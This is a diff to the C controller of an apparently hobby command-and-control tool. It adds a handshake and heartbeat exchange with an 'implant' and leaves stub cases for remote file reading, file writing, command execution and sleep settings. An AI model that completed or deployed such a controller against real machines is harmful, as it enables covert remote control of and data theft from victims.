@@ -58,7 +58,7 @@ int main(int argc, char *argv[])
     if (controller_fd < 0)
     {
         perror("socket");
-        return 0;
+        return 1;
     }
 
     struct sockaddr_in server_ip_structure;
@@ -72,7 +72,7 @@ int main(int argc, char *argv[])
 
         perror("bind");
         close(controller_fd);
-        return 0;
+        return 1;
     }
 
     printf("<Controller Listening on port: %d> \n", ntohs(server_ip_structure.sin_port));
@@ -82,7 +82,7 @@ int main(int argc, char *argv[])
 
         perror("listen");
         close(controller_fd);
-        return 0;
+        return 1;
     }
 
     struct sockaddr_in client_ip_structure;
@@ -94,12 +94,26 @@ int main(int argc, char *argv[])
 
         perror("accept");
         close(controller_fd);
-        return 0;
+        return 1;
     }
 
     printf("<Succesfully established connection to implant, now waiting for HELLO............\n");
 
-    // wait for HELLO from implant, them move onto giving the choice for the user
+    Packet *first_response = recieve_packet(client_fd);
+
+    if (first_response == NULL || first_response->command_type != COMMAND_HELLO)
+    {
+        printf("Unknown inital packet sent from implant! \n");
+        close(client_fd);
+        close(controller_fd);
+        return 1;
+    }
+
+    free_packet(first_response); // free the packet
+
+    printf("Recieved HELLO from implant! \n");
+
+    int request_id = 1; // its 1 because the first message the implant sends is 0
 
     while (1)
     { // while true, as we want the connection to last until we set a
@@ -114,22 +128,56 @@ int main(int argc, char *argv[])
         {
 
         case COMMAND_HEARTBEAT:
+        {
 
-            // no payload
+            request_id++;
+            Packet heartbeat_packet = {COMMAND_HEARTBEAT, request_id, 0, 0};
+
+            send_packet(&heartbeat_packet, client_fd);
+
+            Packet *response = recieve_packet(client_fd);
+
+            if (response == NULL)
+            {
+
+                printf("ERROR:connection error \n");
+                close(client_fd);
+                close(controller_fd);
+                return 1;
+                // TODO:
+            }
+
+            if (response->request_id != request_id)
+            {
+
+                printf("ERROR:connection error \n");
+                close(client_fd);
+                close(controller_fd);
+                free_packet(response);
+                return 1;
+            }
+
+            print_packet_contents(response);
+            free_packet(response);
+            // print response to the screen
+            break;
+        }
 
         case COMMAND_READ_DATA:
 
-            // payload is the path of the file to read from
+            // payload is the path of the file to read from, need to prompt user
 
         case COMMAND_WRITE_DATA:
 
-            // need to craft the payload for the user, so give an option for the path and contents
+            // need to craft the payload for the user (so take in user input, remember the format!), so give an option for the path and contents 
 
         case COMMAND_RUN_CMD:
 
-            // payload is the command
+            // payload is the command, prompt user input
 
         case COMMAND_SET_SLEEP:
+
+            //prompt for user input
 
             // payload is the seconds we sleep for
 
